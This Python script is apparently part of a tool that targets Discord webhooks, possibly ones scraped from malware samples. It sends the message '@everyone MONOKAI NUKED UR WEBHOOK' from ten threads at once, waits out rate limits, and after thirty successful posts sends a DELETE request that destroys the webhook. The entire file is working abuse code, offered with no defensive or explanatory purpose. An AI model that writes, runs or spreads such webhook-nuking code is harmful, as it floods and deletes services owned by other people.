import requests
from colorama import Fore, Style, init
import time
import threading, random
from datetime import datetime
from instances import info, success, error, warning, newlog, monokai

init(autoreset=True)

data = {
    "content": "# @everyone MONOKAI NUKED UR WEBHOOK https://github.com/monokaiidev/triage-webscraper :rofl:"
}

request_count = 0
max_requests = 30
lock = threading.Lock()
stop_spamming = False
threads = 10

def spam_messages(webhook_url):
    global request_count, stop_spamming

    while not stop_spamming:
        try:
            r = requests.post(webhook_url, data=data)
            with lock:
                if r.status_code == 200 or r.status_code == 204:
                    request_count += 1
                    monokai(f"Sent Message to your webhook! ({request_count}/{max_requests})")

                    if request_count >= max_requests:
                        warning("Maximum number of messages reached! Stopping spamming!")
                        monokai("Deleting webhook...")

                        rrrq = requests.delete(webhook_url)
                        if rrrq.status_code == 204:
                            success("Successfully deleted webhook!")
                        else:
                            error("Couldn't delete webhook!")

                        time.sleep(1)
                        request_count = 0
                        stop_spamming = True
                        break

                elif r.status_code == 429:
                    retry_after = r.headers.get("Retry-After")
                    if retry_after:
                        wait_time = int(retry_after) / 1000
                        error(f"Rate limited on {webhook_url}. Waiting for {wait_time} seconds...")
                        time.sleep(wait_time)
                    else:
                        reset_timestamp = int(r.headers.get("X-RateLimit-Reset", 0))
                        reset_time = datetime.utcfromtimestamp(reset_timestamp)
                        current_time = datetime.utcnow()
                        wait_time = (reset_time - current_time).total_seconds()
                        print(f"Rate limited on {webhook_url}. Waiting until {reset_time} UTC ({wait_time} seconds)...")
                        time.sleep(wait_time)

                else:
                    stop_spamming = True
                    break

        except Exception as e:
            print(f"Error occurred: {str(e)}")

def start_spamming(webhook_url):
    global stop_spamming, request_count
    stop_spamming = False
    request_count = 0

    # Creating a pool of threads to increase concurrency
    threads_list = []
    for _ in range(threads):
        spam_thread = threading.Thread(target=spam_messages, args=(webhook_url,))
        threads_list.append(spam_thread)
        spam_thread.start()

    # Wait for all threads to finish
    for thread in threads_list:
        thread.join()


